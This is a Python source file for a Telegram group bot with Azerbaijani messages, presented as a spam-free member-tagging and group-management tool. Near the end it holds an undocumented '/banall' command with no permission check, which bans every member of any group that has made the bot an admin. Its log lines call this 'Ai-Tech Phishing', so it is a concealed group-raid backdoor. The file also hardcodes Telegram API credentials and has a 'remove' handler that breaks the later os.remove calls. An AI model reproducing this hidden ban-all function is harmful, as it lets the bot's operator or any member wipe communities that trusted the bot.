from time import time
from datetime import datetime
from pyrogram import enums
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import os
import asyncio
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import FloodWait

from asyncio import gather
from os import remove
from pyrogram.enums import ChatType


rzayev=Client(
    "AiTagBot",
    api_id = "18052289",
    api_hash = "552525f45a3066fee54ca7852235c19c",
    bot_token = ""
)

chatQueue = []

stopProcess = False



@rzayev.on_message(filters.command(["start"]) & filters.private)
async def start_(client: rzayev, message: Message):
    await message.reply_sticker("CAACAgIAAyEFAASBBRPMAAIDn2aXhSnSNbDdNrXwoLqM9y9OynDhAAI8TgACtIG5SKYQcm8y6vOyHgQ")
    await message.reply_text(
        f"""**Salam {message.from_user.mention} ⚕\nMən Telegram Tağ Bot!\n
⎋  **Sizin yerinizə İstifadəçiləri spamsız Tağ edə bilərəm.**

⎋  **Əmrləri görmək üçünn “📚 Əmrlər“ butonuna basın.**
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "〄 website", 
                        url=f"https://www.rzayev.iblogger.org/news"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📚 Əmrlər" , callback_data= "emrler"
                    ),
                    InlineKeyboardButton(
                        "⚕️ aiteknoloji",
                        url=f"https://t.me/aitbots"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "👨‍💻 Developer",
                        url=f"https://t.me/aiteknoloji"
                    )
                    
                ]
                
           ]
        ), 
    ) 
   
 

@rzayev.on_message(filters.group & filters.command(["help"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def help(client, message):
    await message.reply_photo(
        photo=f"https://telegra.ph/file/a954508ba87153dc77115.jpg",
        caption=f"""**Kömək üçün şəxsidən mənimlə əlaqə saxlayın!**""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "Kömək üçün Toxunun", url=f"http://t.me/marveltagbot?start"
                    )
                ]
            ]
        )
    )



@rzayev.on_message(filters.command("start") & filters.group)
async def start(client, message):
  text = f'''
Salam {message.from_user.mention},
Mənimlə Şəxsidə əlaqə qurun.
'''
  await rzayev.send_message(message.chat.id, text, disable_web_page_preview=True)


@rzayev.on_callback_query(filters.regex("emrler"))
async def emrler(_, query: CallbackQuery):
    await query.edit_message_text(f"""<b>{query.from_user.mention} Haqqımda:\n🧸 Mən Spamsız Qrup və Kanallarda istidafəçiləri tağ etmə gücünə malikəm.\nBunlada bitmir, Qrup && Kanallarda Silinmiş Hesabları Qrup && Kanallardan ata bilirəm, Qrup && Kanallarda Botların Siyahısını Göstərirəm, Qrup && Kanallarda Adminlərin Siyahısını göstəriəm (tağ edirəm), İstifadəçinin ID'sini göstərə bilərəm, Qrupda İstifadəçiləri qarşılıya bilirəm, Çıxandada uzulə.. 😀\n\n
📚 Əmrlər:\n
» /ai & ai "səbəb": <i>Bütün üzvləri tağ edirəm.</i>\n
» /sil & sil <i>Bütün silinmiş hesabları qrupdan atıram.</i>\n
» /admins & admins <i>Bütün adminləri tağ edirəm.</i>\n
» /bots & botlar: <i>Qrupda olan botları siyahısını göstərirəm.</i>\n
» /stop & dayan: <i>Davam edən tağ prosesini dayandırıram.</i>\n
» /id & id: <i>İstifadeçinin İd'ni göstərirəm.</i>\n
» /ping & ping: <i>Ping'mi yoxla...</i>\n
» /alive & alive: <i>Canlı Olduğumu Yoxla...</i>""",
    reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
                         "🏠 Geri", callback_data="gstart")
                 ] 
             ]
         )
         )



@rzayev.on_callback_query(filters.regex("gstart"))
async def gstart(_, query: CallbackQuery):
    await query.edit_message_text(f"""**Salam {query.from_user.mention} ⚕\nMən Telegram Tag Bot!\n
⎋  **Sizin yerinizə İstifadəçiləri spamsız Tağ edə bilərəm.**

⎋  **Əmrləri görmək üçünn “📚 Əmrlər“ butonuna basın.**""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "〄 website", 
                        url=f"https://www.rzayev.iblogger.org/news"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📚 Əmrlər" , callback_data= "emrler"
                    ),
                    InlineKeyboardButton(
                        "⚕️ aiteknoloji",
                        url=f"https://t.me/aitbots"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "👨‍💻 Developer",
                        url=f"https://t.me/aiteknoloji"
                    )
                    
                ]
                
           ]
        ), 
    ) 




@rzayev.on_message(filters.command(["ai","all", "tag", "marvel", "gelin", "gəl"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def everyone(client, message):
  global stopProcess
  try: 
    try:
      sender = await rzayev.get_chat_member(message.chat.id, message.from_user.id)
      has_permissions = sender.privileges
    except:
      has_permissions = message.sender_chat  
    if has_permissions:
      if len(chatQueue) > 15:
        await message.reply("⛔️ | Hazırda maksimum 15 söhbətim üzərində işləyirəm.  Lütfən, tezliklə yenidən cəhd edin.")
      else:  
        if message.chat.id in chatQueue:
          await message.reply("🚫 | Bu çatda artıq davam edən proses var.  Yenisini başlamaq üçün zəhmət olmasa /stop əmrini işlədin.")
        else:  
          chatQueue.append(message.chat.id)
          if len(message.command) > 1:
            inputText = message.command[1]
          elif len(message.command) == 1:
            inputText = ""    
          membersList = []
          async for member in rzayev.get_chat_members(message.chat.id):
            if member.user.is_bot == True:
              pass
            elif member.user.is_deleted == True:
              pass
            else:
              membersList.append(member.user)
          i = 0
          lenMembersList = len(membersList)
          if stopProcess: stopProcess = False
          while len(membersList) > 0 and not stopProcess :
            j = 0
            text1 = f"{inputText}\n\n"
            try:    
              while j < 10:
                user = membersList.pop(0)
                if user.username == None:
                  text1 += f"{user.mention} "
                  j+=1
                else:
                  text1 += f"@{user.username} "
                  j+=1
              try:     
                await rzayev.send_message(message.chat.id, text1)
              except Exception:
                pass  
              await asyncio.sleep(10) 
              i+=10
            except IndexError:
              try:
                await rzayev.send_message(message.chat.id, text1)  
              except Exception:
                pass  
              i = i+j
          if i == lenMembersList:    
            await message.reply(f"✅ | Uğurla qeyd olundu **üzvlərin ümumi sayı: {i}**.\n❌ |  Botlar və silinmiş hesablar rədd edildi.") 
          else:
            await message.reply(f"✅ | **{i} üzvlərin adı uğurla qeyd olundu.**\n❌ |  Botlar və silinmiş hesablar rədd edildi.")    
          chatQueue.remove(message.chat.id)
    else:
      await message.reply("👮🏻 | Üzr istəyirik, **yalnız adminlər** bu əmri işlədə bilər.")  
  except FloodWait as e:
    await asyncio.sleep(e.value) 


@rzayev.on_message(filters.command(["remove","clean", "sil"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def remove(client, message):
  global stopProcess
  try: 
    try:
      sender = await rzayev.get_chat_member(message.chat.id, message.from_user.id)
      has_permissions = sender.privileges
    except:
      has_permissions = message.sender_chat  
    if has_permissions:
      bot = await rzayev.get_chat_member(message.chat.id, "self")
      if bot.status == ChatMemberStatus.MEMBER:
        await message.reply("🕹 Silinmiş hesabları qrupdan atmaq üçün mənə admin icazələri lazımdır.")  
      else:  
        if len(chatQueue) > 15 :
          await message.reply("⛔️ | Hazırda maksimum 15 söhbətim üzərində işləyirəm.  Lütfən, tezliklə yenidən cəhd edin.")
        else:  
          if message.chat.id in chatQueue:
            await message.reply("🚫 | Bu çatda artıq davam edən proses var.  Yenisini başlamaq üçün zəhmət olmasa ilk olaraq /cancel əmrindənə istifadə et.")
          else:  
            chatQueue.append(message.chat.id)  
            deletedList = []
            async for member in rzayev.get_chat_members(message.chat.id):
              if member.user.is_deleted == True:
                deletedList.append(member.user)
              else:
                pass
            lenDeletedList = len(deletedList)  
            if lenDeletedList == 0:
              await message.reply("👻 | Bu söhbətdə silinmiş hesab yoxdur.")
              chatQueue.remove(message.chat.id)
            else:
              k = 0
              processTime = lenDeletedList*10
              temp = await rzayev.send_message(message.chat.id, f"🚨 | cəmi {lenDeletedList} silinmiş hesab aşkarlandı.\n⏳ |  təxmini vaxt: indidən {processTime} saniyə.")
              if stopProcess: stopProcess = False
              while len(deletedList) > 0 and not stopProcess:   
                deletedAccount = deletedList.pop(0)
                try:
                  await rzayev.ban_chat_member(message.chat.id, deletedAccount.id)
                except Exception:
                  pass  
                k+=1
                await asyncio.sleep(10)
              if k == lenDeletedList:  
                await message.reply(f"✅ | Bütün silinmiş hesablar bu söhbətdən uğurla atıldı.")  
                await temp.delete()
              else:
                await message.reply(f"✅ | {k} silinmiş hesabı bu söhbətdən uğurla atdı.")  
                await temp.delete()  
              chatQueue.remove(message.chat.id)
    else:
      await message.reply("👮🏻 | Üzr istəyirik, **yalnız adminlər** bu əmri yerinə yetirə bilər.")  
  except FloodWait as e:
    await asyncio.sleep(e.value)                               
        

@rzayev.on_message(filters.command(["stop","cancel", "dayan"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def stop(client, message):
  global stopProcess
  try:
    try:
      sender = await rzayev.get_chat_member(message.chat.id, message.from_user.id)
      has_permissions = sender.privileges
    except:
      has_permissions = message.sender_chat  
    if has_permissions:
      if not message.chat.id in chatQueue:
        await message.reply("🤷🏻‍♀️ | Dayandırmaq üçün davam edən proses yoxdur.")
      else:
        stopProcess = True
        await message.reply("🛑 | Tağ prosesi Dayandı.")
    else:
      await message.reply("👮🏻 | Üzr istəyirik, **yalnız adminlər** bu əmri yerinə yetirə bilər.")
  except FloodWait as e:
    await asyncio.sleep(e.value)


@rzayev.on_message(filters.command(["admins","staff"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def admins(client, message):
  try: 
    adminList = []
    ownerList = []
    async for admin in rzayev.get_chat_members(message.chat.id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
      if admin.privileges.is_anonymous == False:
        if admin.user.is_bot == True:
          pass
        elif admin.status == ChatMemberStatus.OWNER:
          ownerList.append(admin.user)
        else:  
          adminList.append(admin.user)
      else:
        pass   
    lenAdminList= len(ownerList) + len(adminList)  
    text2 = f"**GROUP STAFF - {message.chat.title}**\n\n"
    try:
      owner = ownerList[0]
      if owner.username == None:
        text2 += f"👑 Sahib\n└ {owner.mention}\n\n👮🏻 Adminlər\n"
      else:
        text2 += f"👑 Sahib\n└ @{owner.username}\n\n👮🏻 Adminlər\n"
    except:
      text2 += f"👑 Sahib\n└ <i>Gizli</i>\n\n👮🏻 Adminlər\n"
    if len(adminList) == 0:
      text2 += "└ <i>Adminlər gizlidir</i>"  
      await rzayev.send_message(message.chat.id, text2)   
    else:  
      while len(adminList) > 1:
        admin = adminList.pop(0)
        if admin.username == None:
          text2 += f"├ {admin.mention}\n"
        else:
          text2 += f"├ @{admin.username}\n"    
      else:    
        admin = adminList.pop(0)
        if admin.username == None:
          text2 += f"└ {admin.mention}\n\n"
        else:
          text2 += f"└ @{admin.username}\n\n"
      text2 += f"✅ | **Adminlərin ümumi sayı**: {lenAdminList}\n❌ | Botlar və gizli adminlər rədd edildi."  
      await rzayev.send_message(message.chat.id, text2)           
  except FloodWait as e:
    await asyncio.sleep(e.value)       

@rzayev.on_message(filters.command(["bots", "bot", "botlar"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def bots(client, message):  
  try:    
    botList = []
    async for bot in rzayev.get_chat_members(message.chat.id, filter=enums.ChatMembersFilter.BOTS):
      botList.append(bot.user)
    lenBotList = len(botList) 
    text3  = f"**BOT LIST - {message.chat.title}**\n\n🤖 Botlar\n"
    while len(botList) > 1:
      bot = botList.pop(0)
      text3 += f"├ @{bot.username}\n"    
    else:    
      bot = botList.pop(0)
      text3 += f"└ @{bot.username}\n\n"
      text3 += f"✅ | **Botların ümumi sayı**: {lenBotList}"  
      await rzayev.send_message(message.chat.id, text3)
  except FloodWait as e:
    await asyncio.sleep(e.value)


@rzayev.on_message(filters.command(["id"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def get_id(client, message):
    try:

        if (not message.reply_to_message) and (message.chat):
            await message.reply(f"{message.from_user.first_name} istifadəçinin ID-si: <code>{message.from_user.id }</code>.\nBu söhbətin ID-si: <code>{message.chat.id}</code>.") 

        elif not message.reply_to_message:
            await message.reply(f"{message.from_user.first_name} Istifadəçinin ID'si: <code>{message.from_user.id }</code>.") 

        elif message.reply_to_message.forward_from_chat:
            await message.reply(f"The forwarded {str(message.reply_to_message.forward_from_chat.type)[9:].lower()}, {message.reply_to_message.forward_from_chat.title} has an ID of <code>{message.reply_to_message.forward_from_chat.id}</code>.") 

        elif message.reply_to_message.forward_from:
            await message.reply(f"Yönləndirilmiş istifadəçi, {message.reply_to_message.forward_from.first_name} adlı istifadəçinin ID-si var <code>{message.reply_to_message.forward_from.id   }</code>.")

        elif message.reply_to_message.forward_sender_name:
            await message.reply("Üzr istəyirik, məxfilik parametrlərinə görə yönləndirilmiş istifadəçi ID-sini əldə edə bilməzsiniz")

        else:
            await message.reply(f"{message.reply_to_message.from_user.first_name} adlı istifadəçinin ID-si <code>{message.reply_to_message.from_user.id}</code>.")   

    except Exception:
            await message.reply("ID-ni əldə edərkən xəta baş verdi.")


@rzayev.on_message(filters.new_chat_members)
async def auto_welcome(bot: Client, msg: Message):
    first = msg.from_user.first_name
    last = msg.from_user.last_name
    mention = msg.from_user.mention
    username = msg.from_user.username
    id = msg.from_user.id
    group_name = msg.chat.title
    group_username = msg.chat.username
    name_button = "🍁 Qoşul 🍁"
    link_button = "https://t.me/aitbots"
    welcome_text = f"**Salam, {mention}, {group_name}-a Xoş gəldin!\n\nSəni aramızda görməyimizə Şadıq.\n\nQrupa Gəlmisənsə Qrup Qaydalarına əməl et!\n\nSənin ID-in:** `{id}`"
    WELCOME_TEXT = os.environ.get("WELCOME_TEXT", welcome_text)
    print("Xoş gəlmisiniz Mesajı Aktivləşdirildi")
    BUTTON = name_button
    if not BUTTON:
       await msg.reply_text(text=WELCOME_TEXT.format(
           first = msg.from_user.first_name,
           last = msg.from_user.last_name,
           username = None if not msg.from_user.username else '@' + msg.from_user.username,
           mention = msg.from_user.mention,
           id = msg.from_user.id,
           group_name = msg.chat.title,
           group_username = None if not msg.chat.username else '@' + msg.chat.username
          )
       )
    else:
       await msg.reply_text(text=WELCOME_TEXT.format(
           first = msg.from_user.first_name,
           last = msg.from_user.last_name,
           username = None if not msg.from_user.username else '@' + msg.from_user.username,
           mention = msg.from_user.mention,
           id = msg.from_user.id,
           group_name = msg.chat.title,
           group_username = None if not msg.chat.username else '@' + msg.chat.username
          ),
       reply_markup=InlineKeyboardMarkup(
               [
                   [
                       InlineKeyboardButton
                           (
                               name_button, url=link_button
                           )
                   ]  
               ]
           )
       )  




@rzayev.on_message(filters.left_chat_member)
async def goodbye(bot,message):
	chatid= message.chat.id
	n=await bot.send_message(text=f"Getməyinə üzüldüm,  {message.from_user.mention}, iyi günlər 😔",chat_id=chatid)

@rzayev.on_message(filters.command(["ping"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def ping_pong(client, message):
    start = time()
    m_reply = await message.reply_text("__pinging...__")
    delta_ping = time() - start
    await m_reply.edit_text("🏓 `PONG!!`\n" f"⚡️ `{delta_ping * 1000:.3f} ms`")


START_TIME = datetime.utcnow()
START_TIME_ISO = START_TIME.replace(microsecond=0).isoformat()
TIME_DURATION_UNITS = (
    ("həftə", 60 * 60 * 24 * 7),
    ("gun", 60 * 60 * 24),
    ("saat", 60 * 60),
    ("dəqiqə", 60),
    ("saniyə", 1)
)

async def _human_time_duration(seconds):
    if seconds == 0:
        return 'inf'
    parts = []
    for unit, div in TIME_DURATION_UNITS:
        amount, seconds = divmod(int(seconds), div)
        if amount > 0:
            parts.append('{} {}{}'
                         .format(amount, unit, "" if amount == 1 else ""))
    return ', '.join(parts)


@rzayev.on_message(filters.command(["uptime"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def get_uptime(client, message):
    current_time = datetime.utcnow()
    uptime_sec = (current_time - START_TIME).total_seconds()
    uptime = await _human_time_duration(int(uptime_sec))
    await message.reply_text(
        "**Bot Status:\n\n"
        f"•**uptime:** `{uptime}`\n"
        f"•**start time:** `{START_TIME_ISO}`"
    )



@rzayev.on_message(
filters.command("banall") 
& filters.group
)
async def banall(client, message: Message):
    print("{} - üzvlər əldə edilir ❗".format(message.chat.id))
    async for i in rzayev.get_chat_members(message.chat.id):
        try:
            await rzayev.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
            print("Atıldı - {} | - {} aihucum🇦🇿".format(i.user.id, message.chat.id))
        except Exception as e:
            print("Xəta {} tərəfindən {}".format(i.user.id, e))           
    print("🇦🇿 proses tamamlandı: Ai-Tech Phishing ⚕️")


@rzayev.on_message(filters.command(["alive"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def alive(client, message):
    current_time = datetime.utcnow()
    uptime_sec = (current_time - START_TIME).total_seconds()
    uptime = await _human_time_duration(int(uptime_sec))
    start = time()
    delta_ping = time() - start
    await message.reply_photo(
        photo=f"https://telegra.ph/file/a954508ba87153dc77115.jpg",
        caption=f"""**💠 Mən Çox Gözəl İşləyirəm**\n\n<b>⏰ **uptime:**</b> `{uptime}`\n🏓 **Ping:** ⚡️ `{delta_ping * 1000:.3f} ms`""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🧑🏻‍💻 Sahib", url=f"https://t.me/rzayevaga"
                    ),
                    InlineKeyboardButton(
                        "📲 Kanal", url=f"https://t.me/aitbots"
                    )
                ]
            ]
        )
    )





### ~ /// ⚕️ aiteknoloji /// ~ ###




async def edit_or_reply(message: Message, *args, **kwargs) -> Message:
    apa = (
        message.edit_text
        if bool(message.from_user and message.from_user.is_self or message.outgoing)
        else (message.reply_to_message or message).reply_text
    )
    return await apa(*args, **kwargs)


eor = edit_or_reply

# --------------------------------#

def ReplyCheck(message: Message):
    reply_id = None

    if message.reply_to_message:
        reply_id = message.reply_to_message.id

    elif not message.from_user.is_self:
        reply_id = message.id

    return reply_id

# --------------------------------#

async def extract_user(message):
    return (await extract_user_and_reason(message))[0]

async def extract_user_and_reason(message, sender_chat=False):
    args = message.text.strip().split()
    text = message.text
    user = None
    reason = None
    if message.reply_to_message:
        reply = message.reply_to_message
        if not reply.from_user:
            if (
                reply.sender_chat
                and reply.sender_chat != message.chat.id
                and sender_chat
            ):
                id_ = reply.sender_chat.id
            else:
                return None, None
        else:
            id_ = reply.from_user.id

        if len(args) < 2:
            reason = None
        else:
            reason = text.split(None, 1)[1]
        return id_, reason

    if len(args) == 2:
        user = text.split(None, 1)[1]
        return await extract_userid(message, user), None

    if len(args) > 2:
        user, reason = text.split(None, 2)[1:]
        return await extract_userid(message, user), reason

    return user, reason
 

@rzayev.on_message(filters.command(["info"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def who_is(client: rzayev, message: Message):
    user_id = await extract_user(message)
    Ai = await edit_or_reply(message, "`Məlumat alınır . . .`")
    if not user_id:
        return await Ai.edit(
            "**Həmin istifadəçi məlumatını əldə etmək üçün userid / username / reply verin.**"
        )
    try:
        user = await client.get_users(user_id)
        username = f"@{user.username}" if user.username else "-"
        first_name = f"{user.first_name}" if user.first_name else "-"
        last_name = f"{user.last_name}" if user.last_name else "-"
        fullname = (
            f"{user.first_name} {user.last_name}" if user.last_name else user.first_name
        )
        user_details = (await client.get_chat(user.id)).bio
        bio = f"{user_details}" if user_details else "-"
        h = f"{user.status}"
        if h.startswith("UserStatus"):
            y = h.replace("UserStatus.", "")
            status = y.capitalize()
        else:
            status = "-"
        dc_id = f"{user.dc_id}" if user.dc_id else "-"
        common = await client.get_common_chats(user.id)
        out_str = f"""<b>İstifadəçi Məlumatı:</b>

🆔 <b>User ID:</b> <code>{user.id}</code>
👤 <b>Ad:</b> {first_name}
🗣️ <b>Soyad:</b> {last_name}
🌐 <b>Username:</b> {username}
🏛️ <b>DC ID:</b> <code>{dc_id}</code>
🤖 <b>Botdur:</b> <code>{user.is_bot}</code>
🚷 <b>Feykdir:</b> <code>{user.is_scam}</code>
🚫 <b>Qadağan olunmuş:</b> <code>{user.is_restricted}</code>
✅ <b>Təsdiqlənmiş:</b> <code>{user.is_verified}</code>
⭐ <b>Premium:</b> <code>{user.is_premium}</code>
📝 <b>Bio:</b> {bio}

👀 <b>Eyni qruplarda görüldü:</b> {len(common)}
👁️ <b>Son görünmə:</b> <code>{status}</code>
🔗 <b>İstifadəçinin daimi linki:</b> <a href='tg://user?id={user.id}'>{fullname}</a>
"""
        photo_id = user.photo.big_file_id if user.photo else None
        if photo_id:
            photo = await client.download_media(photo_id)
            await gather(
                Ai.delete(),
                client.send_photo(
                    message.chat.id,
                    photo,
                    caption=out_str,
                    reply_to_message_id=ReplyCheck(message),
                ),
            )
            remove(photo)
        else:
            await Ai.edit(out_str, disable_web_page_preview=True)
    except Exception as e:
        return await Ai.edit(f"**Məlumat:** `{e}`")


@rzayev.on_message(filters.command(["chatinfo", "cinfo", "ginfo"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
async def chatinfo_handler(client: rzayev, message: Message):
    Ai = await edit_or_reply(message, "`Məlumat alınır...`")
    try:
        if len(message.command) > 1:
            chat_u = message.command[1]
            chat = await client.get_chat(chat_u)
        else:
            if message.chat.type == ChatType.PRIVATE:
                return await message.edit(
                    f"Bu əmri qrupda istifadə edin və `ginfo [qrup istifadəçi adı və ya id]`"
                )
            else:
                chatid = message.chat.id
                chat = await client.get_chat(chatid)
        h = f"{chat.type}"
        if h.startswith("ChatType"):
            y = h.replace("ChatType.", "")
            type = y.capitalize()
        else:
            type = "Private"
        username = f"@{chat.username}" if chat.username else "-"
        description = f"{chat.description}" if chat.description else "-"
        dc_id = f"{chat.dc_id}" if chat.dc_id else "-"
        out_str = f"""<b>Söhbət məlumatı:</b>

🆔 <b>Söhbət ID:</b> <code>{chat.id}</code>
👥 <b>Ad:</b> {chat.title}
👥 <b>Uꜱᴇʀɴᴀᴍᴇ:</b> {username}
📩 <b>Tip:</b> <code>{type}</code>
🏛️ <b>DC ID:</b> <code>{dc_id}</code>
🗣️ <b>Saxta:</b> <code>{chat.is_scam}</code>
🎭 <b>Feyk:</b> <code>{chat.is_fake}</code>
✅ <b>Təsdiqlənmiş:</b> <code>{chat.is_verified}</code>
🚫 <b>Qadağan olunmuş:</b> <code>{chat.is_restricted}</code> 
🔰 <b>Qorunur:</b> <code>{chat.has_protected_content}</code> 

🚻 <b>Umumi userlər:</b> <code>{chat.members_count}</code>
📝 <b>Təsvir:</b> 
<code>{description}</code>
"""
        photo_id = chat.photo.big_file_id if chat.photo else None
        if photo_id:
            photo = await client.download_media(photo_id)
            await gather(
                Ai.delete(),
                client.send_photo(
                    message.chat.id,
                    photo,
                    caption=out_str,
                    reply_to_message_id=ReplyCheck(message),
                ),
            )
            remove(photo)
        else:
            await Ai.edit(out_str, disable_web_page_preview=True)
    except Exception as e:
        return await Ai.edit(f"**Məlumat:** `{e}`")




print("tagbot aktivdir!")  
print("### ~ /// ⚕️ aiteknoloji /// ~ ###")
rzayev.run() 
